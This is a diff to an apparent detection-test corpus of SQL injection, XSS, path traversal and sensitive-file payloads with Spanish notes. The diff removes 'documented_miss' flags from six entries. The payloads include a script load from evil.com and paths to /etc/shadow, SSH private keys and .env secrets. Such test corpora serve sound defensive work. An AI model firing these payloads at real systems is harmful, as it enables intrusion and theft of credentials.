@@ -32,7 +32,7 @@
     {"id": "sqli-029", "rule": "sqli", "payload": "' UNION SELECT @@version--", "note": "versión del servidor"},
     {"id": "sqli-030", "rule": "sqli", "payload": "1; EXEC sp_executesql N'SELECT 1'", "note": "dinamic SQL apilado"},
     {"id": "sqli-031", "rule": "sqli", "payload": "-1 UNION ALL SELECT null,concat(user,0x3a,version())--", "note": "volcado de usuario y versión"},
-    {"id": "sqli-032", "rule": "sqli", "payload": "1' AND ASCII(SUBSTRING(nombre,1,1))>64--", "note": "blind boolean carácter a carácter", "documented_miss": true},
+    {"id": "sqli-032", "rule": "sqli", "payload": "1' AND ASCII(SUBSTRING(nombre,1,1))>64--", "note": "blind boolean carácter a carácter"},
 
     {"id": "xss-001", "rule": "xss", "payload": "<script>alert(1)</script>", "note": "XSS básico"},
     {"id": "xss-002", "rule": "xss", "payload": "<SCRIPT SRC=http://evil.com/x.js></SCRIPT>", "note": "carga de script externo, mayúsculas"},
@@ -62,8 +62,8 @@
     {"id": "xss-026", "rule": "xss", "payload": "<<script>alert(1)//<</script>", "note": "etiqueta duplicada"},
     {"id": "xss-027", "rule": "xss", "payload": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", "note": "data URI con HTML"},
     {"id": "xss-028", "rule": "xss", "payload": "<img alt=\"x\" src=x onerror=alert(String.fromCharCode(88,83,83))>", "note": "ofuscación de la cadena"},
-    {"id": "xss-029", "rule": "xss", "payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "note": "entidades HTML", "documented_miss": true},
-    {"id": "xss-030", "rule": "xss", "payload": "<a href=&#106;avascript:alert(1)>x</a>", "note": "entidad en javascript:", "documented_miss": true},
+    {"id": "xss-029", "rule": "xss", "payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "note": "entidades HTML"},
+    {"id": "xss-030", "rule": "xss", "payload": "<a href=&#106;avascript:alert(1)>x</a>", "note": "entidad en javascript:"},
 
     {"id": "trav-001", "rule": "path_traversal", "payload": "../../../../etc/passwd", "note": "traversal clásico"},
     {"id": "trav-002", "rule": "path_traversal", "payload": "..%2f..%2fetc%2fpasswd", "note": "codificado en URL"},
@@ -77,7 +77,7 @@
     {"id": "trav-010", "rule": "path_traversal", "payload": "....\\/....\\/etc/passwd", "note": "combinación de puntos extra y backslash"},
     {"id": "trav-011", "rule": "path_traversal", "payload": "file:///etc/passwd", "note": "URL scheme file:"},
     {"id": "trav-012", "rule": "path_traversal", "payload": "/var/www/../../etc/shadow", "note": "salida de un directorio permitido"},
-    {"id": "trav-013", "rule": "path_traversal", "payload": "..%c0%af..%c0%afetc/passwd", "note": "UTF-8 sobre-long", "documented_miss": true},
+    {"id": "trav-013", "rule": "path_traversal", "payload": "..%c0%af..%c0%afetc/passwd", "note": "UTF-8 sobre-long"},
 
     {"id": "files-001", "rule": "sensitive_files", "payload": "/etc/shadow", "note": "hashes de contraseñas"},
     {"id": "files-002", "rule": "sensitive_files", "payload": "/etc/group", "note": "grupos del sistema"},
@@ -86,6 +86,6 @@
     {"id": "files-005", "rule": "sensitive_files", "payload": "C:\\windows\\win.ini", "note": "fichero clásico de prueba"},
     {"id": "files-006", "rule": "sensitive_files", "payload": "/home/user/.ssh/id_rsa", "note": "clave privada SSH"},
     {"id": "files-007", "rule": "sensitive_files", "payload": "/var/www/app/.env", "note": "secretos de la aplicación"},
-    {"id": "files-008", "rule": "sensitive_files", "payload": "web-inf/web.xml", "note": "configuración Java", "documented_miss": true}
+    {"id": "files-008", "rule": "sensitive_files", "payload": "web-inf/web.xml", "note": "configuración Java"}
   ]
 }
